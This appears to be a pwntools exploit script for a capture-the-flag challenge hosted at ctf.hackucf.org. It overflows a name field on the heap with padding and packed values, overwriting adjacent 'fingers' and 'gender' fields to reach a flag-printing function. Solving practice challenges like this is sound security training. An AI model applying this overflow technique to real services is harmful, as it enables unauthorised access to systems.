from pwn import *
import time
"""
TARGET => GENDER = 1337 | FINGERS = 10.
                     0x00000000      0x00000011
                     0x096975b0      0x00000007        <-- fingers  
--> gender           0x00000008      0x00021a19        <-- Top chunk
"""
context.log_level = "DEBUG"
context.arch = 'i386'
"""
binary = './main'
p = process(binary)
elf =ELF(binary,checksec=0)
"""
p = remote('ctf.hackucf.org', 7001)


def init_name(name):
    p.sendline(name)
def init_fingers(fingers):
    p.sendline(str(fingers))
def init_gender(gender):
    p.sendline(str(gender))
def change_name(name):
    p.sendline('2')
    p.sendline(name)
def change_gender(gender):
    p.sendline('3')
    p.sendline(str(gender))

init_name("A"*28)
time.sleep(0.5)
init_fingers(7)
time.sleep(0.5)
init_gender(8)
time.sleep(0.5)
payload = b"A" * 36 + p32(0x11) + p32(0x0) + p32(0xa) + p32(0x539)
change_name(payload)
'''
to get flag just chang gender it will triggerd display_gender() which givesthe flag
'''
p.interactive()
